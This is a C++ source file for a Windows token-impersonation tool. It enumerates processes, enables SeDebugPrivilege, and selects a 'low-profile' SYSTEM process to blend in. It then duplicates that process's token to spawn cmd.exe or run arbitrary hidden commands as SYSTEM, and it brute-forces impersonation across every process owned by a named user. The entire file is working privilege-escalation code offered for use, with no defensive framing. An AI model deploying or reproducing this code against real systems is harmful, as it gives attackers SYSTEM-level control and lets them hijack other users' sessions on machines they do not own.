#include "tokenImpersonate.h"
#include <windows.h>
#include <sddl.h>
#include <strsafe.h>
#include <tlhelp32.h>
#include <stdio.h>

#pragma comment (lib, "Advapi32.lib")

void tokenImpersonate::CombineUserDomainName(PCHAR Domain, PCHAR UserName, PCHAR Output, size_t OutputSize) {
    StringCchCopyA(Output, OutputSize, Domain);
    StringCchCatA(Output, OutputSize, "\\");
    StringCchCatA(Output, OutputSize, UserName);
}

BOOL tokenImpersonate::GetProcessInfo(PROCESSENTRY32* processEntry32, PProcessInfo Process) {
    HANDLE ProcessH = NULL, ProcessTokenH = NULL;
    
    Process->PID = processEntry32->th32ProcessID;
    Process->Valid = FALSE;
    Process->Domain_User_Name[0] = '\0';
    Process->IsElevated = FALSE;
    Process->IntegrityLevel[0] = '\0';
    
    MultiByteToWideChar(CP_ACP, 0, processEntry32->szExeFile, -1, Process->Name_Process, 260);
    
    ProcessH = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, Process->PID);
    if (ProcessH == NULL) {
        ProcessH = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, Process->PID);
        if (ProcessH == NULL) {
            return FALSE;
        }
    }
    
    if (!OpenProcessToken(ProcessH, TOKEN_QUERY, &ProcessTokenH)) {
        CloseHandle(ProcessH);
        return FALSE;
    }
    
    DWORD ProcessTokenOwnerSize = 0;
    PTOKEN_OWNER ProcessTokenOwnerP = NULL;
    
    GetTokenInformation(ProcessTokenH, TokenOwner, NULL, 0, &ProcessTokenOwnerSize);
    if (ProcessTokenOwnerSize > 0) {
        ProcessTokenOwnerP = (PTOKEN_OWNER)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ProcessTokenOwnerSize);
        
        if (ProcessTokenOwnerP != NULL) {
            if (GetTokenInformation(ProcessTokenH, TokenOwner, ProcessTokenOwnerP, ProcessTokenOwnerSize, &ProcessTokenOwnerSize)) {
                Process->SID_OwnerP = ProcessTokenOwnerP->Owner;
                
                DWORD owner_name_bufsize = 256, domain_name_bufsize = 256;
                SID_NAME_USE SidType;
                CHAR Username[256] = {0};
                CHAR Domain[256] = {0};
                
                if (LookupAccountSidA(NULL, Process->SID_OwnerP, Username, &owner_name_bufsize, 
                                     Domain, &domain_name_bufsize, &SidType)) {
                    CombineUserDomainName(Domain, Username, Process->Domain_User_Name, 256);
                    Process->Valid = TRUE;
                }
            }
            HeapFree(GetProcessHeap(), 0, ProcessTokenOwnerP);
        }
    }
    
    TOKEN_ELEVATION elevation;
    DWORD elevationSize = sizeof(TOKEN_ELEVATION);
    if (GetTokenInformation(ProcessTokenH, TokenElevation, &elevation, elevationSize, &elevationSize)) {
        Process->IsElevated = elevation.TokenIsElevated;
    }
    
    DWORD integrityLevelSize = 0;
    GetTokenInformation(ProcessTokenH, TokenIntegrityLevel, NULL, 0, &integrityLevelSize);
    
    if (integrityLevelSize > 0) {
        PTOKEN_MANDATORY_LABEL integrityLevel = (PTOKEN_MANDATORY_LABEL)HeapAlloc(GetProcessHeap(), 
                                                                                   HEAP_ZERO_MEMORY, 
                                                                                   integrityLevelSize);
        
        if (integrityLevel != NULL) {
            if (GetTokenInformation(ProcessTokenH, TokenIntegrityLevel, integrityLevel, 
                                   integrityLevelSize, &integrityLevelSize)) {
                DWORD dwIntegrityLevel = *GetSidSubAuthority(integrityLevel->Label.Sid, 
                    (DWORD)(UCHAR)(*GetSidSubAuthorityCount(integrityLevel->Label.Sid) - 1));
                
                if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID) {
                    strcpy(Process->IntegrityLevel, "SYSTEM");
                } else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) {
                    strcpy(Process->IntegrityLevel, "HIGH");
                } else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID) {
                    strcpy(Process->IntegrityLevel, "MEDIUM");
                } else if (dwIntegrityLevel >= SECURITY_MANDATORY_LOW_RID) {
                    strcpy(Process->IntegrityLevel, "LOW");
                } else {
                    strcpy(Process->IntegrityLevel, "UNTRUSTED");
                }
            }
            HeapFree(GetProcessHeap(), 0, integrityLevel);
        }
    }
    
    CloseHandle(ProcessH);
    CloseHandle(ProcessTokenH);
    
    return Process->Valid;
}

PProcessList tokenImpersonate::EnumerateProcesses() {
    PProcessList processList = new ProcessList;
    processList->count = 0;
    
    HANDLE currentProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (currentProcessSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to create process snapshot! Error: %lu\n", GetLastError());
        return processList;
    }
    
    PROCESSENTRY32 processHolder;
    processHolder.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(currentProcessSnapshot, &processHolder)) {
        printf("[!] Could not enumerate processes! Error: %lu\n", GetLastError());
        CloseHandle(currentProcessSnapshot);
        return processList;
    }
    
    do {
        if (processHolder.th32ProcessID == 0 || processHolder.th32ProcessID == 4) {
            continue;
        }
        
        if (processList->count >= MAX_PROCESSES) {
            printf("[!] Warning: Process limit reached (%d processes)\n", MAX_PROCESSES);
            break;
        }
        
        if (GetProcessInfo(&processHolder, &processList->processes[processList->count])) {
            processList->count++;
        }
        
    } while (Process32Next(currentProcessSnapshot, &processHolder));
    
    CloseHandle(currentProcessSnapshot);
    return processList;
}

BOOL tokenImpersonate::EnableDebugPrivilege() {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("[!] Failed to open process token. Error: %lu\n", GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        printf("[!] Failed to lookup SeDebugPrivilege. Error: %lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        printf("[!] Failed to adjust token privileges. Error: %lu\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    DWORD dwError = GetLastError();
    if (dwError == ERROR_NOT_ALL_ASSIGNED) {
        printf("[!] SeDebugPrivilege not assigned to current user\n");
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    printf("[+] SeDebugPrivilege enabled successfully\n");
    return TRUE;
}

BOOL tokenImpersonate::hasImpersonatePrivilege() {
    HANDLE currentProcessAccessToken = NULL;
    
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &currentProcessAccessToken)) {
        printf("[!] Failed to open process token. Error: %lu\n", GetLastError());
        return FALSE;
    }
    
    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_IMPERSONATE_NAME, &luid)) {
        printf("[!] Failed to lookup SeImpersonatePrivilege. Error: %lu\n", GetLastError());
        CloseHandle(currentProcessAccessToken);
        return FALSE;
    }
    
    PRIVILEGE_SET privilegeSet;
    privilegeSet.PrivilegeCount = 1;
    privilegeSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
    privilegeSet.Privilege[0].Luid = luid;
    privilegeSet.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = FALSE;
    if (!PrivilegeCheck(currentProcessAccessToken, &privilegeSet, &result)) {
        printf("[!] Failed to check privilege. Error: %lu\n", GetLastError());
        CloseHandle(currentProcessAccessToken);
        return FALSE;
    }
    
    CloseHandle(currentProcessAccessToken);
    return result;
}

int tokenImpersonate::FindBestSystemProcess() {
    PProcessList processList = EnumerateProcesses();
    
    const char* preferredProcesses[] = {
        "spoolsv.exe",
        "SearchIndexer.exe",
        "taskhost.exe",
        "dllhost.exe",
        "msdtc.exe",
        "wininit.exe",
        "sppsvc.exe",
        "winlogon.exe",
        "services.exe",
        "svchost.exe"
    };
    
    int numPreferred = sizeof(preferredProcesses) / sizeof(preferredProcesses[0]);
    
    for (int p = 0; p < numPreferred; p++) {
        for (int i = 0; i < processList->count; i++) {
            char procName[260];
            WideCharToMultiByte(CP_UTF8, 0, processList->processes[i].Name_Process, -1, 
                               procName, 260, NULL, NULL);
            
            if (strstr(processList->processes[i].Domain_User_Name, "SYSTEM") != NULL &&
                _stricmp(procName, preferredProcesses[p]) == 0) {
                
                int targetPID = processList->processes[i].PID;
                delete processList;
                
                printf("[*] Selected low-profile SYSTEM process: %s (PID %d)\n", procName, targetPID);
                return targetPID;
            }
        }
    }
    
    for (int i = 0; i < processList->count; i++) {
        if (strstr(processList->processes[i].Domain_User_Name, "SYSTEM") != NULL) {
            int targetPID = processList->processes[i].PID;
            delete processList;
            return targetPID;
        }
    }
    
    delete processList;
    return 0;
}

int tokenImpersonate::ImpersonateTokenAndSpawnNewProcess(int TargetPID, PWCHAR ProcessToLaunch) {
    HANDLE TargetProcH = NULL, TargetProcTokenH = NULL, NewTokenH = NULL;
    STARTUPINFOW StartupInfo;
    PROCESS_INFORMATION ProcessInformation;
    
    ZeroMemory(&StartupInfo, sizeof(STARTUPINFOW));
    ZeroMemory(&ProcessInformation, sizeof(PROCESS_INFORMATION));
    StartupInfo.cb = sizeof(STARTUPINFOW);
    
    TargetProcH = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, TargetPID);
    if (TargetProcH == NULL) {
        TargetProcH = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, TargetPID);
        if (TargetProcH == NULL) {
            printf("[!] Failed to open target process! Error: %lu\n", GetLastError());
            printf("[!] The process may be protected or you lack permissions\n");
            return -1;
        }
    }
    
    if (!OpenProcessToken(TargetProcH, TOKEN_DUPLICATE | TOKEN_QUERY, &TargetProcTokenH)) {
        DWORD err = GetLastError();
        printf("[!] Failed to open target process token! Error: %lu\n", err);
        
        if (err == 5) {
            printf("[!] ACCESS_DENIED - Process is protected or requires higher privileges\n");
        }
        
        CloseHandle(TargetProcH);
        return -1;
    }
    
    if (!DuplicateTokenEx(TargetProcTokenH, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, 
                         TokenPrimary, &NewTokenH)) {
        printf("[!] Failed to duplicate token! Error: %lu\n", GetLastError());
        CloseHandle(TargetProcTokenH);
        CloseHandle(TargetProcH);
        return -1;
    }
    
    WCHAR cmdLine[MAX_PATH];
    wcscpy(cmdLine, L"C:\\Windows\\System32\\cmd.exe");
    
    DWORD ProcessCreationFlags = CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP;
    
    if (!CreateProcessWithTokenW(NewTokenH, LOGON_WITH_PROFILE, NULL, cmdLine, 
                                ProcessCreationFlags, NULL, NULL, &StartupInfo, &ProcessInformation)) {
        DWORD err = GetLastError();
        
        if (!CreateProcessWithTokenW(NewTokenH, 0, NULL, cmdLine, ProcessCreationFlags, 
                                    NULL, NULL, &StartupInfo, &ProcessInformation)) {
            err = GetLastError();
            printf("[!] Failed to create new process! Error: %lu\n", err);
            
            if (err == ERROR_PRIVILEGE_NOT_HELD) {
                printf("[!] Insufficient privileges - SeImpersonatePrivilege required\n");
            } else if (err == 2) {
                printf("[!] Process executable not found\n");
            } else if (err == 87) {
                printf("[!] Invalid parameter in process creation\n");
            } else if (err == 5) {
                printf("[!] Access denied - target process may be protected\n");
            }
            
            CloseHandle(TargetProcTokenH);
            CloseHandle(TargetProcH);
            CloseHandle(NewTokenH);
            return -1;
        }
    }
    
    printf("[+] Successfully created process with PID: %lu\n", ProcessInformation.dwProcessId);
    
    CloseHandle(TargetProcTokenH);
    CloseHandle(TargetProcH);
    CloseHandle(NewTokenH);
    CloseHandle(ProcessInformation.hProcess);
    CloseHandle(ProcessInformation.hThread);
    
    return ProcessInformation.dwProcessId;
}

int tokenImpersonate::ImpersonateTokenAndExecuteCommand(int TargetPID, PWCHAR CommandLine) {
    HANDLE TargetProcH = NULL, TargetProcTokenH = NULL, NewTokenH = NULL;
    STARTUPINFOW StartupInfo;
    PROCESS_INFORMATION ProcessInformation;
    
    ZeroMemory(&StartupInfo, sizeof(STARTUPINFOW));
    ZeroMemory(&ProcessInformation, sizeof(PROCESS_INFORMATION));
    StartupInfo.cb = sizeof(STARTUPINFOW);
    StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    StartupInfo.wShowWindow = SW_HIDE;
    
    // Open target process
    TargetProcH = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, TargetPID);
    if (TargetProcH == NULL) {
        TargetProcH = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, TargetPID);
        if (TargetProcH == NULL) {
            printf("[!] Failed to open target process! Error: %lu\n", GetLastError());
            return -1;
        }
    }
    
    // Open process token with more permissions
    if (!OpenProcessToken(TargetProcH, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TargetProcTokenH)) {
        printf("[!] Failed to open process token! Error: %lu\n", GetLastError());
        CloseHandle(TargetProcH);
        return -1;
    }
    
    // Duplicate token with SecurityDelegation for network access
    if (!DuplicateTokenEx(TargetProcTokenH, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, 
                         TokenPrimary, &NewTokenH)) {
        // Fallback to SecurityImpersonation
        if (!DuplicateTokenEx(TargetProcTokenH, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, 
                             TokenPrimary, &NewTokenH)) {
            printf("[!] Failed to duplicate token! Error: %lu\n", GetLastError());
            CloseHandle(TargetProcTokenH);
            CloseHandle(TargetProcH);
            return -1;
        }
    }
    
    // Create writable command buffer
    WCHAR cmdBuffer[4096];
    wcscpy(cmdBuffer, CommandLine);
    
    // Use CREATE_NEW_CONSOLE instead of CREATE_NO_WINDOW for network access
    DWORD ProcessCreationFlags = CREATE_NEW_CONSOLE | NORMAL_PRIORITY_CLASS;
    StartupInfo.wShowWindow = SW_HIDE;
    
    // Attempt 1: With profile
    if (!CreateProcessWithTokenW(NewTokenH, LOGON_WITH_PROFILE, NULL, cmdBuffer, 
                                ProcessCreationFlags, NULL, NULL, &StartupInfo, &ProcessInformation)) {
        
        // Attempt 2: Without profile
        if (!CreateProcessWithTokenW(NewTokenH, LOGON_NETCREDENTIALS_ONLY, NULL, cmdBuffer, 
                                    ProcessCreationFlags, NULL, NULL, &StartupInfo, &ProcessInformation)) {
            
            // Attempt 3: Basic creation
            if (!CreateProcessWithTokenW(NewTokenH, 0, NULL, cmdBuffer, ProcessCreationFlags, 
                                        NULL, NULL, &StartupInfo, &ProcessInformation)) {
                DWORD err = GetLastError();
                printf("[!] Failed to execute command! Error: %lu\n", err);
                
                CloseHandle(TargetProcTokenH);
                CloseHandle(TargetProcH);
                CloseHandle(NewTokenH);
                return -1;
            }
        }
    }
    
    printf("[+] Successfully executed command with PID: %lu\n", ProcessInformation.dwProcessId);
    
    // Cleanup
    CloseHandle(TargetProcTokenH);
    CloseHandle(TargetProcH);
    CloseHandle(NewTokenH);
    CloseHandle(ProcessInformation.hProcess);
    CloseHandle(ProcessInformation.hThread);
    
    return ProcessInformation.dwProcessId;
}

int tokenImpersonate::FindProcessesByUsername(const char* username, int* pidArray, int maxPids) {
    PProcessList processList = EnumerateProcesses();
    int foundCount = 0;
    
    printf("[*] Searching for processes owned by: %s\n", username);
    
    for (int i = 0; i < processList->count && foundCount < maxPids; i++) {
        if (strstr(processList->processes[i].Domain_User_Name, username) != NULL) {
            pidArray[foundCount] = processList->processes[i].PID;
            
            char procName[260];
            WideCharToMultiByte(CP_UTF8, 0, processList->processes[i].Name_Process, -1, 
                               procName, 260, NULL, NULL);
            
            printf("  [*] Found: PID %d - %s (Elevated: %s, Integrity: %s)\n",
                   pidArray[foundCount],
                   procName,
                   processList->processes[i].IsElevated ? "YES" : "NO",
                   processList->processes[i].IntegrityLevel);
            
            foundCount++;
        }
    }
    
    delete processList;
    printf("[*] Total processes found: %d\n\n", foundCount);
    return foundCount;
}

int tokenImpersonate::BruteForceImpersonateByUsername(const char* username, PWCHAR command) {
    int pidArray[MAX_PROCESSES];
    int foundCount = FindProcessesByUsername(username, pidArray, MAX_PROCESSES);
    
    if (foundCount == 0) {
        printf("[!] No processes found for username: %s\n", username);
        return -1;
    }
    
    printf("[*] Attempting brute-force token impersonation...\n");
    printf("[*] Will try all %d processes until success\n\n", foundCount);
    
    for (int i = 0; i < foundCount; i++) {
        printf("  [*] Attempt %d/%d - Trying PID %d...\n", i+1, foundCount, pidArray[i]);
        
        int result = 0;
        
        if (command == NULL) {
            result = ImpersonateTokenAndSpawnNewProcess(pidArray[i], (PWCHAR)L"cmd.exe");
        } else {
            result = ImpersonateTokenAndExecuteCommand(pidArray[i], command);
        }
        
        if (result > 0) {
            printf("\n");
            printf("  [+++] SUCCESS! [+++]\n");
            printf("  [+] Successfully impersonated PID %d\n", pidArray[i]);
            printf("  [+] New process PID: %d\n", result);
            return result;
        } else {
            printf("  [-] Failed with PID %d, trying next...\n\n", pidArray[i]);
        }
    }
    
    printf("[!] All attempts failed - no accessible processes for this user\n");
    return -1;
}
